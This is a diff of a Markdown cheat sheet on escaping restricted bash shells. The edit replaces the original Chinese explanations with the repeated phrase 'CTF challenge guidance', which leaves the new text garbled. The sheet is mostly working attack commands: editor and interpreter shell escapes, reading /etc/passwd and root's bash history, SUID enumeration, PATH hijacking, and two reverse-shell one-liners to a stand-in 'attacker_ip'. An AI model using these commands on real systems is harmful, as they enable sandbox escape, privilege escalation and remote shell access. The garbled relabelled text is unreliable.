@@ -1,38 +1,38 @@
-# Bash Jail 逃逸大全
+# Bash Jail CTF challenge guidance
 
-## 逃逸决策树
+## CTF challenge guidance
 
 ```
-受限 shell (rbash/rksh)
-├── 能否使用 cd?
-│   ├── 能 → cd /; sh 切换到完整 shell
-│   └── 不能 → 找编辑器/其他命令
-├── 能否使用引号/转义?
-│   ├── 能 → `whoami` 或 $(whoami)
-│   └── 不能 → 找其他命令执行方式
-├── 能否访问特殊文件?
-│   ├── /dev/tcp → 反弹 shell
-│   ├── /proc → 读敏感文件
-│   └── 能否读 HISTFILE → 读历史命令
-└── 是否有命令白名单?
-    ├── vi/vim → :!/bin/sh 逃逸
+CTF challenge guidance shell (rbash/rksh)
+├── CTF challenge guidance cd 
+│   ├── CTF challenge guidance → cd /; sh CTF challenge guidance shell
+│   └── CTF challenge guidance → CTF challenge guidance/CTF challenge guidance
+├── CTF challenge guidance/CTF challenge guidance 
+│   ├── CTF challenge guidance → `whoami` CTF challenge guidance $(whoami)
+│   └── CTF challenge guidance → CTF challenge guidance
+├── CTF challenge guidance 
+│   ├── /dev/tcp → CTF challenge guidance shell
+│   ├── /proc → CTF challenge guidance
+│   └── CTF challenge guidance HISTFILE → CTF challenge guidance
+└── CTF challenge guidance 
+    ├── vi/vim → :!/bin/sh CTF challenge guidance
     ├── awk → awk 'BEGIN {system("id")}'
     ├── find → find ... -exec
-    └── python/perl → 直接执行命令
+    └── python/perl → CTF challenge guidance
 ```
 
-## 逃逸技术
+## CTF challenge guidance
 
-### 1. 编辑器逃逸
+### 1. CTF challenge guidance
 ```bash
-vi/vim: :!/bin/sh  或  :!/bin/bash
+vi/vim: :!/bin/sh  CTF challenge guidance  :!/bin/bash
 vim:   :shell
 less:  !/bin/sh
 more:  !/bin/sh
 man:   !/bin/sh
 ```
 
-### 2. 编程语言逃逸
+### 2. CTF challenge guidance
 ```bash
 awk:    awk 'BEGIN {system("whoami")}'
 perl:   perl -e 'system("whoami")'
@@ -41,49 +41,49 @@ ruby:   ruby -e 'system("whoami")'
 lua:    lua -e 'os.execute("whoami")'
 ```
 
-### 3. 文件操作逃逸
+### 3. CTF challenge guidance
 ```bash
 find:   find / -exec whoami \;
 dd:     dd if=/dev/null of=/dev/null
 cp:     cp /dev/null /tmp/a; cat /tmp/a
 ```
 
-### 4. 特殊文件描述符
+### 4. CTF challenge guidance
 ```bash
-# 读取 /etc/passwd
+# CTF challenge guidance /etc/passwd
 cat /etc/passwd
 dd if=/etc/passwd
 ```
 
-### 5. 读历史命令
+### 5. CTF challenge guidance
 ```bash
 cat ~/.bash_history
 cat /root/.bash_history
 ```
 
-### 6. 反弹 Shell
+### 6. CTF challenge guidance Shell
 ```bash
 bash -i >& /dev/tcp/attacker_ip/port 0>&1
 python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
-## rbash 特限制
+## rbash CTF challenge guidance
 
-| 限制 | 绕过方法 |
+| CTF challenge guidance | CTF challenge guidance |
 |------|---------|
-| 不能 cd | `cd /; /bin/bash` |
-| 不能使用 / | 利用相对路径或内置命令 |
-| 不能使用 $() | 反引号 `` `$var` `` |
-| 不能使用环境变量 | 继承父进程环境 |
-| 不能重定向 | `/dev/null` 写文件 |
+| CTF challenge guidance cd | `cd /; /bin/bash` |
+| CTF challenge guidance / | CTF challenge guidance |
+| CTF challenge guidance $() | CTF challenge guidance `` `$var` `` |
+| CTF challenge guidance | CTF challenge guidance |
+| CTF challenge guidance | `/dev/null` CTF challenge guidance |
 
-## 利用 SUID 提权
+## CTF challenge guidance SUID CTF challenge guidance
 
 ```bash
-# 查找 SUID 文件
+# CTF challenge guidance SUID CTF challenge guidance
 find / -perm -4000 2>/dev/null
 
-# 常见可提权 SUID
+# CTF challenge guidance SUID
 /usr/bin/sudo
 /usr/bin/python
 /usr/bin/perl
@@ -93,10 +93,10 @@ find / -perm -4000 2>/dev/null
 /bin/nice
 ```
 
-## 利用 Path 变量
+## CTF challenge guidance Path CTF challenge guidance
 
 ```bash
-# 如果可以设置 PATH
+# CTF challenge guidance PATH
 export PATH=/tmp:$PATH
-# 在 /tmp 放置恶意程序
+# CTF challenge guidance /tmp CTF challenge guidance
 ```
